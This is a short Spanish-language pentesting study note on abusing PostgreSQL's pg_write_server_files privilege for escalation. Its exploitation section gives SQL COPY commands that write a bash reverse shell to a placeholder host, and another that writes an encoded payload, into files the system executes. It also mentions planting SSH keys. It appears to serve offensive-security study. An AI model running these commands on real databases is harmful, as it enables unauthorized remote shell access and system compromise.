-----
- Tags: #teoria #practica #escalada 
------
# Abuso de permisos de escirutas en sistemas de Gestion de Base de Datos

### El abuso de privilegios de escritura es un tema imporante en la seguridad e baeses de datos, ya que los usuarios malintencionados pueden aprovechar estos privilegios para manipular o dañar datos, insertar información maliciosa o incluso obtener acceso no autorizado al sitema. Aunque los nombres específicos de los permissos pueden variar entre diferentes sistemas de base de datos, el concepto de abuso es relevante en todos ellos.
-----
# Explotación 

### Por ejemplo, en **PostgreSQL** existe un privilegio denominado **pg_write_server_files** el cual como mencionamos permite al usuario que lo posee la manipulación de archivos existentes, lo que podría suponer un riesgo de cara a la seguridad y un punto crucial de interes para el atacante.

### Esto de podría utilizar para depositar claves ssh en los repositorios ssh del usuario, ingresar código malicioso en archivos que se ejecutan a nivel de sistema o incluso ejecutar comandos a nivel de sistema.

```sql
-- Insertar líneas de código en un determinado archivo
COPY (SELECT CAST('bash -i >& /dev/tcp/{host}/{port} 0>&1' AS text)) TO '/path/to/executing/code';

-- Insertar líneas de código de manera alterna
copy (SELECT convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) TO '/just/a/path.exec';
```
### Más detalles del abuso de estos privilegios pueden ser encontrados en [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql).